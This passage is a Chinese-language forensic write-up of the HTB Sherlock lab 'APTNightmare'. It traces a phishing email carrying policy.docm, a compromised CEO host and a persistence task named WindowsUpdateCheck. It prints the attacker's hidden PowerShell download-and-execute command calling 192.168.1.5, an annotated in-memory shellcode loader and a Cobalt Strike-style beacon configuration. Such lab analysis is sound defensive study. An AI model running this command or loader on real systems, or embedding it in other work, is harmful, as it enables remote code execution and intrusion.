cs-corp.cd  =0A=0A=C2=A0=</span><br><span class="line">--Citadel--Multipart--cs-corp.cd--022a--000e</span><br><span class="line">Content-type: text/html; charset=utf-8</span><br><span class="line">Content-Transfer-Encoding: quoted-printable</span><br><span class="line">&lt;html&gt;&lt;body&gt;</span><br><span class="line">&lt;p&gt;Dear CEO,&lt;br /&gt;&lt;br /&gt;I hope this message finds you well. We&#x27;ve drafted=</span><br><span class="line"> our updated privacy policy ahead of schedule. Please review the attached=</span><br><span class="line"> document and share any objections or suggestions with HR via email.&lt;br /=</span><br><span class="line">&gt;&lt;br /&gt;Your input is valuable=E2=80=94thank you&lt;br /&gt;&lt;br /&gt;Mr.AK, cs-corp=</span><br><span class="line">.cd&lt;/p&gt;=0A&lt;p&gt;=C2=A0&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line">--Citadel--Multipart--cs-corp.cd--022a--000e--</span><br><span class="line">--Citadel--Multipart--cs-corp.cd--022a--000d</span><br><span class="line">Content-type: application/vnd.ms-word.document.macroEnabled.12</span><br><span class="line">Content-disposition: attachment; filename=&quot;policy.docm&quot;</span><br><span class="line">Content-transfer-encoding: base64</span><br><span class="line">UEsDBBQABgAIAAAAIQALivyRkQEAADIGAAATAAgCW0NvbnRlbnRfVHlwZXNdLnhtbCCi</span><br><span class="line">BAIooAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>
+
+<p>对应一下答案长度得到<code>Review Revised Privacy Policy</code></p>
+<blockquote>
+<p>Review Revised Privacy Policy</p>
+</blockquote>
+<h2 id="Task-16"><a href="#Task-16" class="headerlink" title="Task 16"></a>Task 16</h2><h3 id="What-is-the-name-of-the-malicious-attachment"><a href="#What-is-the-name-of-the-malicious-attachment" class="headerlink" title="What is the name of the malicious attachment?"></a>What is the name of the malicious attachment?</h3><p>task15 上面有文件名</p>
+<blockquote>
+<p>policy.docm</p>
+</blockquote>
+<h2 id="Task-17"><a href="#Task-17" class="headerlink" title="Task 17"></a>Task 17</h2><h3 id="Please-identify-the-usernames-of-the-CEOs-who-received-the-attachment"><a href="#Please-identify-the-usernames-of-the-CEOs-who-received-the-attachment" class="headerlink" title="Please identify the usernames of the CEOs who received the attachment."></a>Please identify the usernames of the CEOs who received the attachment.</h3><p>匹配cdblog内的关键字</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ strings  cdb.log|grep  -E <span class="string">&#x27;[a-z]&#123;3&#125;\-[a-z]&#123;2&#125;&#x27;</span>  -o|<span class="built_in">sort</span> -u|grep ceo</span><br><span class="line">ceo-ru</span><br><span class="line">ceo-us</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>ceo-ru,ceo-us</p>
+</blockquote>
+<h2 id="Task-18"><a href="#Task-18" class="headerlink" title="Task 18"></a>Task 18</h2><h3 id="What-is-the-hostname-for-the-compromised-CEO"><a href="#What-is-the-hostname-for-the-compromised-CEO" class="headerlink" title="What is the hostname for the compromised CEO?"></a>What is the hostname for the compromised CEO?</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ grep -a -i <span class="string">&#x27;computername&#x27;</span> ./* -r</span><br><span class="line">./C/Windows/System32/config/SOFTWARE.LOG2:?? !vkTimeStampIntervalYW]^vk -LastComputerNameDESKTOP-ELS5JAKUnk 5+- PBR(sk8@?</span><br></pre></td></tr></table></figure>
+
+<p>strings搜出来的关键字的文件，进一步搜部分主机名<code>desktop-ELS</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ strings -e b ./C/Windows/System32/config/SOFTWARE.LOG2|grep -a -i <span class="string">&#x27;DESKTOP-ELS&#x27;</span>          </span><br><span class="line">\DESKTOP-ELS5JAK\OneNote (Desktop)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>DESKTOP-ELS5JAK</p>
+</blockquote>
+<h2 id="Task-19"><a href="#Task-19" class="headerlink" title="Task 19"></a>Task 19</h2><h3 id="What-is-the-full-path-for-the-malicious-attachment"><a href="#What-is-the-full-path-for-the-malicious-attachment" class="headerlink" title="What is the full path for the malicious attachment?"></a>What is the full path for the malicious attachment?</h3><p>已经从<strong>task 15</strong>知道恶意文件名<code>policy.docm</code>所以直接搜文件名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ grep -a <span class="string">&#x27;policy.docm&#x27;</span> ./* -r                                                                                                                                                     </span><br><span class="line">./C/<span class="variable">$MFT</span>:policy.lnk&#125;LF  *W*Weh;WJPO :+00:.<span class="comment">#K&amp;]B_&amp;%VWWd2JEX POLICY~1.DOCH        EXEX3,policy.docmT-SKHNC:\Users\ceo-us\Downloads\policy.docm$..\..\..\..\..\Downloads\policy.docmC:\U</span></span><br><span class="line">sers\ceo-us\Downloads`Xdesktop-els5jakX&lt;v<span class="comment">#lEBVOv\</span></span><br><span class="line">                                                <span class="string">&#x27;rX&lt;v#lEBVOv\</span></span><br><span class="line"><span class="string">./C/Users/ceo-us/AppData/Roaming/Microsoft/Windows/Recent/AutomaticDestinations/fb3b0dbfee58fac8.automaticDestinations-ms:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">LF *W*Weh;WJPO :+00/C:\P1Users&lt; .UsersT1ceo-us&gt; .ceo-us\1DownloadsD     .Downloads2JEX POLICY~1.DOCH    EXEX3,policy.docmHWord.DocumentMacroEnabled.12T-SKHNC:\Users\ceo-us\Downloads\policy.docm`Xdesktop-els5jakX&lt;v#lEBVOv\</span></span><br><span class="line"><span class="string">                                       &#x27;</span>rX&lt;v<span class="comment">#lEBVOv\</span></span><br><span class="line">                                                   <span class="string">&#x27;rr  -1SPSU(Ly9K-</span></span><br><span class="line"><span class="string">                                                                    91SPSmDpHH@.=xhH@~P@^X&lt;v#lEBVOv\</span></span><br><span class="line"><span class="string">                                                                                                   &#x27;</span>rX&lt;v<span class="comment">#lEBVOv\</span></span><br><span class="line">                                                                                                               <span class="string">&#x27;rdesktop-els5jak@&#x27;</span>w-W%C:\Users\ceo-us\Downloads\policy.docm</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>C:\Users\ceo-us\Downloads\policy.docm</p>
+</blockquote>
+<h2 id="Task-20"><a href="#Task-20" class="headerlink" title="Task 20"></a>Task 20</h2><h3 id="What-was-the-command-used-to-gain-initial-access"><a href="#What-was-the-command-used-to-gain-initial-access" class="headerlink" title="What was the command used to gain initial access?"></a>What was the command used to gain initial access?</h3><p>导出powershell.evtx查看记录</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-26.png" alt="alt text"></p>
+<blockquote>
+<p>powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.1.5:806/a">http://192.168.1.5:806/a</a>‘))</p>
+</blockquote>
+<h2 id="Task-21"><a href="#Task-21" class="headerlink" title="Task 21"></a>Task 21</h2><h3 id="What-is-the-Popular-threat-label-for-the-malicious-executable-used-in-the-initial-access-vector"><a href="#What-is-the-Popular-threat-label-for-the-malicious-executable-used-in-the-initial-access-vector" class="headerlink" title="What is the Popular threat label for the malicious executable used in the initial access vector?"></a>What is the Popular threat label for the malicious executable used in the initial access vector?</h3><p>回流量包找’<a target="_blank" rel="noopener" href="http://192.168.1.5:806/a'%E7%9A%84%E4%BA%A4%E4%BA%92%E6%B5%81%E9%87%8F">http://192.168.1.5:806/a&#39;的交互流量</a></p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-27.png" alt="alt text"></p>
+<p>看返回包</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-28.png" alt="alt text"></p>
+<p>导出返回包内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&quot;H4sIAAAAAAAA/+...=&quot;));</span><br><span class="line"></span><br><span class="line">IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();</span><br></pre></td></tr></table></figure>
+
+<p>base64+解包得到原内容</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-29.png" alt="alt text"></p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-30.png" alt="alt text"></p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-31.png" alt="alt text"></p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">Set-StrictMode -Version <span class="number">2</span></span><br><span class="line"></span><br><span class="line">function func_get_proc_address &#123;</span><br><span class="line">	Param ($var_module, $var_procedure)		</span><br><span class="line">	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(<span class="string">&#x27;\\&#x27;</span>)[<span class="number">-1</span>].Equals(<span class="string">&#x27;System.dll&#x27;</span>) &#125;).GetType(<span class="string">&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;</span>)</span><br><span class="line">	<span class="meta">#通过反射获得Microsoft.Win32.UnsafeNativeMethods的类</span></span><br><span class="line">	</span><br><span class="line">	$var_gpa = $var_unsafe_native_methods.GetMethod(<span class="string">&#x27;GetProcAddress&#x27;</span>, [Type[]] @(<span class="string">&#x27;System.Runtime.InteropServices.HandleRef&#x27;</span>, <span class="string">&#x27;string&#x27;</span>))</span><br><span class="line">	<span class="meta">#通过反射获取 UnsafeNativeMethods 类中的 GetProcAddress 方法，接受两个参数 HandleRef 和 string</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $var_gpa.Invoke($<span class="literal">null</span>, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(<span class="string">&#x27;GetModuleHandle&#x27;</span>)).Invoke($<span class="literal">null</span>, </span><br><span class="line">	<span class="meta">#调用 GetProcAddress 获取DLL中的函数名字,这里先通过反射调用 GetModuleHandle 方法，    以获取传入DLL的句柄,。</span></span><br><span class="line">	</span><br><span class="line">	@($var_module)))), $var_procedure))</span><br><span class="line">	<span class="meta">#最终效果返回是getProcaddress指定dll的指定函数名的函数地址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function func_get_delegate_type &#123;</span><br><span class="line">	Param (</span><br><span class="line">		[<span class="meta">Parameter(Position = 0, Mandatory = $True)</span>] [Type[]] $var_parameters,</span><br><span class="line">		[<span class="meta">Parameter(Position = 1)</span>] [Type] $var_return_type = [Void]</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(<span class="string">&#x27;ReflectedDelegate&#x27;</span>)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(<span class="string">&#x27;InMemoryModule&#x27;</span>, $<span class="literal">false</span>).DefineType(<span class="string">&#x27;MyDelegateType&#x27;</span>, <span class="string">&#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;</span>, [System.MulticastDelegate])</span><br><span class="line">	<span class="meta">#通过 AppDomain.CurrentDomain.DefineDynamicAssembly 创建了一个新的动态程序集。具体来说 &quot;AssemblyName(&#x27;ReflectedDelegate&#x27;)&quot; 创建一个程序集名称为 ReflectedDelegate。AssemblyBuilderAccess.Run 指定这个程序集的访问权限为运行时访问，意味着它会在运行时生成和执行</span></span><br><span class="line">	<span class="meta">#在这个动态程序集下，定义了一个名为 InMemoryModule 的模块。第二个参数 $false 表示该模块不会被持久化到磁盘，而是仅存在于内存中。</span></span><br><span class="line">	<span class="meta">#在这个模块下，定义了一个名为 MyDelegateType 的类，它继承自 System.MulticastDelegate </span></span><br><span class="line">	<span class="meta">#https://learn.microsoft.com/en-us/dotnet/api/system.reflection.emit.modulebuilder.definetype?view=net-9.0</span></span><br><span class="line"></span><br><span class="line">	$var_type_builder.DefineConstructor(<span class="string">&#x27;RTSpecialName, HideBySig, Public&#x27;</span>, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(<span class="string">&#x27;Runtime, Managed&#x27;</span>)</span><br><span class="line">	<span class="meta">#定义要创建类的构造函数,函数的参数类型是传入的 var_parameters 定义的</span></span><br><span class="line">	<span class="meta">#https://learn.microsoft.com/en-us/dotnet/api/system.reflection.emit.typebuilder.defineconstructor?view=net-9.0</span></span><br><span class="line"></span><br><span class="line">	$var_type_builder.DefineMethod(<span class="string">&#x27;Invoke&#x27;</span>, <span class="string">&#x27;Public, HideBySig, NewSlot, Virtual&#x27;</span>, $var_return_type, $var_parameters).SetImplementationFlags(<span class="string">&#x27;Runtime, Managed&#x27;</span>)</span><br><span class="line">	<span class="meta">#给这个类添加一个 Invoke 方法,参数类型也是传入的 var_parameters 定义的</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $var_type_builder.CreateType()</span><br><span class="line">	<span class="meta">#返回这个动态创建的类</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">If ([IntPtr]::size -eq <span class="number">8</span>) &#123;</span><br><span class="line">	[<span class="meta">Byte[</span>]]$var_code = [System.Convert]::FromBase64String(<span class="string">&#x27;bnlicXZrqsZr...&#x27;</span>);</span><br><span class="line">	<span class="keyword">for</span> ($x = <span class="number">0</span>; $x -lt $var_code.Count; $x++) &#123;</span><br><span class="line">		$var_code[$x] = $var_code[$x] -bxor <span class="number">35</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span><br><span class="line">	<span class="meta">#通过反射获取 VirtualAlloc 函数的地址 ,并添加一个调用函数的委托</span></span><br><span class="line">	</span><br><span class="line">	$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line">	<span class="meta">#调用virutalAlloc分配内存(目标内存基地址,len,权限,类型,保护属性)</span></span><br><span class="line"></span><br><span class="line">	[<span class="meta">System.Runtime.InteropServices.Marshal</span>]::Copy($var_code, <span class="number">0</span>, $var_buffer, $var_code.length)</span><br><span class="line">	<span class="meta">#将解码后的替换到原base64的地址</span></span><br><span class="line">	$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span><br><span class="line">	<span class="meta">#创建一个函数委托方法 invoke</span></span><br><span class="line">	$var_runme.Invoke([IntPtr]::Zero)</span><br><span class="line">	<span class="meta">#调用委托执行载荷</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拖出来base64部分，xor35之后解码</p>
+<p><img src="/wpimages/2025/Sherlocks/APTNightmare/image-32.png" alt="alt text"></p>
+<p>用<a target="_blank" rel="noopener" href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py">1768</a>分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 1768.py ~/Desktop/htblue/output.bin                                                          </span><br><span class="line">File: /home/fonllge/Desktop/htblue/output.bin                                                            </span><br><span class="line">payloadType: 0x00007530                                                                                  </span><br><span class="line">payloadSize: 0x00000001                                                                                  </span><br><span class="line">intxorkey: 0x00000001                                                                                    </span><br><span class="line">id2: 0x000000ff                                                                                          </span><br><span class="line">Config found: xorkey b&#x27;.&#x27; 0x0003aa30 0x00040200                                                          </span><br><span class="line">0x0001 payload type                     0x0001 0x0002 0 windows-beacon_http-reverse_http                 </span><br><span class="line">0x0002 port                             0x0001 0x0002 3334                                               </span><br><span class="line">0x0003 sleeptime                        0x0002 0x0004 60000                                              </span><br><span class="line">0x0004 maxgetsize                       0x0002 0x0004 1048576                                            </span><br><span class="line">0x0005 jitter                           0x0001 0x0002 0                                                  </span><br><span class="line">0x0007 publickey                        0x0003 0x0100 30819f300d06092a864886f70d010101050003818d00308189028181009872e9417999ab6cc4b5b541e04dae76bd09ff8c6cdb26ec4adfdf376d12624b4774c6f104a637c9d8d12da6d6412fdca18</span><br><span class="line">5ff082306cc043a898f87ee56f52c1eb436e99931bf42ab12eb88a3ad01519e3715cbe2d55179e79b7834bd7030e30fa33f4d731a5227567e026e2f95a1934a0fc5c71ebfd3f321f9440c71962f3b020301000100000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000                                                                   </span><br><span class="line">0x0008 server,get-uri                   0x0003 0x0100 &#x27;192.168.1.5,/ptj&#x27;                                 </span><br><span class="line">0x0043 DNS_STRATEGY                     0x0001 0x0002 1                                                  </span><br><span class="line">0x0044 DNS_STRATEGY_ROTATE_SECONDS      0x0002 0x0004 -1                                                                                                                                                           </span><br><span class="line">0x0045 DNS_STRATEGY_FAIL_X              0x0002 0x0004 -1                                                 </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>windows-beacon_http-reverse_http</p>
+</blockquote>
+<h2 id="Task-23"><a href="#Task-23" class="headerlink" title="Task 23"></a>Task 23</h2><h3 id="What-is-task-name-has-been-add-by-attacker"><a href="#What-is-task-name-has-been-add-by-attacker" class="headerlink" title="What is task name has been add by attacker?"></a>What is task name has been add by attacker?</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~/…/C/Windows/System32/Tasks]</span><br><span class="line">└─$ <span class="built_in">ls</span></span><br><span class="line"> Microsoft                                                                                                           <span class="string">&#x27;OneDrive Per-Machine Standalone Update Task&#x27;</span></span><br><span class="line"> MicrosoftEdgeUpdateTaskUserS-1-5-21-2017299850-386824222-3026461460-1001Core&#123;CD1FD5BC-B219-4BCF-A94C-7C9F8A8E59D5&#125;  <span class="string">&#x27;OneDrive Reporting Task-S-1-5-21-2017299850-386824222-3026461460-1001&#x27;</span></span><br><span class="line"> MicrosoftEdgeUpdateTaskUserS-1-5-21-2017299850-386824222-3026461460-1001UA&#123;23B87CEE-6FE7-47A3-82BC-AC8916860FC5&#125;     WindowsUpdateCheck</span><br></pre></td></tr></table></figure>
+
+<p>检查更新的定时任务正常来说不会用cmd来做，而且这个目录下一般不会有这个exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-16&quot;</span>?&gt;</span><br><span class="line">&lt;Task version=<span class="string">&quot;1.2&quot;</span> xmlns=<span class="string">&quot;http://schemas.microsoft.com/windows/2004/02/mit/task&quot;</span>&gt;</span><br><span class="line">  &lt;RegistrationInfo&gt;</span><br><span class="line">    &lt;Date&gt;2024-02-04T18:22:15&lt;/Date&gt;</span><br><span class="line">    &lt;Author&gt;DESKTOP-ELS5JAK\ceo-us&lt;/Author&gt;</span><br><span class="line">    &lt;URI&gt;\WindowsUpdateCheck&lt;/URI&gt;</span><br><span class="line">  &lt;/RegistrationInfo&gt;</span><br><span class="line">  &lt;Triggers&gt;</span><br><span class="line">    &lt;CalendarTrigger&gt;</span><br><span class="line">      &lt;StartBoundary&gt;2024-02-04T12:00:00&lt;/StartBoundary&gt;</span><br><span class="line">      &lt;Enabled&gt;<span class="literal">true</span>&lt;/Enabled&gt;</span><br><span class="line">      &lt;ScheduleByDay&gt;</span><br><span class="line">        &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;</span><br><span class="line">      &lt;/ScheduleByDay&gt;</span><br><span class="line">    &lt;/CalendarTrigger&gt;</span><br><span class="line">  &lt;/Triggers&gt;</span><br><span class="line">  &lt;Settings&gt;</span><br><span class="line">    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;</span><br><span class="line">    &lt;DisallowStartIfOnBatteries&gt;<span class="literal">true</span>&lt;/DisallowStartIfOnBatteries&gt;</span><br><span class="line">    &lt;StopIfGoingOnBatteries&gt;<span class="literal">true</span>&lt;/StopIfGoingOnBatteries&gt;</span><br><span class="line">    &lt;AllowHardTerminate&gt;<span class="literal">true</span>&lt;/AllowHardTerminate&gt;</span><br><span class="line">    &lt;StartWhenAvailable&gt;<span class="literal">false</span>&lt;/StartWhenAvailable&gt;</span><br><span class="line">    &lt;RunOnlyIfNetworkAvailable&gt;<span class="literal">false</span>&lt;/RunOnlyIfNetworkAvailable&gt;</span><br><span class="line">    &lt;IdleSettings&gt;</span><br><span class="line">      &lt;Duration&gt;PT10M&lt;/Duration&gt;</span><br><span class="line">      &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;</span><br><span class="line">      &lt;StopOnIdleEnd&gt;<span class="literal">true</span>&lt;/StopOnIdleEnd&gt;</span><br><span class="line">      &lt;RestartOnIdle&gt;<span class="literal">false</span>&lt;/RestartOnIdle&gt;</span><br><span class="line">    &lt;/IdleSettings&gt;</span><br><span class="line">    &lt;AllowStartOnDemand&gt;<span class="literal">true</span>&lt;/AllowStartOnDemand&gt;</span><br><span class="line">    &lt;Enabled&gt;<span class="literal">true</span>&lt;/Enabled&gt;</span><br><span class="line">    &lt;Hidden&gt;<span class="literal">false</span>&lt;/Hidden&gt;</span><br><span class="line">    &lt;RunOnlyIfIdle&gt;<span class="literal">false</span>&lt;/RunOnlyIfIdle&gt;</span><br><span class="line">    &lt;WakeToRun&gt;<span class="literal">false</span>&lt;/WakeToRun&gt;</span><br><span class="line">    &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;</span><br><span class="line">    &lt;Priority&gt;7&lt;/Priority&gt;</span><br><span class="line">  &lt;/Settings&gt;</span><br><span class="line">  &lt;Actions Context=<span class="string">&quot;Author&quot;</span>&gt;</span><br><span class="line">    &lt;Exec&gt;</span><br><span class="line">      &lt;Command&gt;c:\Windows\system32\cmd.exe&lt;/Command&gt;</span><br><span class="line">      &lt;Arguments&gt;/c start C:\Users\Public\WindowsUpdate.exe&lt;/Arguments&gt;</span><br><span class="line">    &lt;/Exec&gt;</span><br><span class="line">  &lt;/Actions&gt;</span><br><span class="line">  &lt;Principals&gt;</span><br><span class="line">    &lt;Principal <span class="built_in">id</span>=<span class="string">&quot;Author&quot;</span>&gt;</span><br><span class="line">      &lt;UserId&gt;DESKTOP-ELS5JAK\ceo-us&lt;/UserId&gt;</span><br><span class="line">      &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;</span><br><span class="line">      &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;</span><br><span class="line">    &lt;/Principal&gt;</span><br><span class="line">  &lt;/Principals&gt;</span><br><span class="line">&lt;/Task&gt;</span><br></pre></td></tr></table></figure>
+
+
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left  disabled "
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2025/02/26/box-wp-Checker/"
+      title="【season-7】 htb Checker wp"
+     >
+
+    <p class="title-text">
+      
+        【season-7】 htb Checker wp
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+
+
+
+
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2025 Flower<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
+        <i class="fa-solid fa-angle-up"></i>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.classList.remove('hide')
+        } else {
+            btn.classList.add('hide')
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
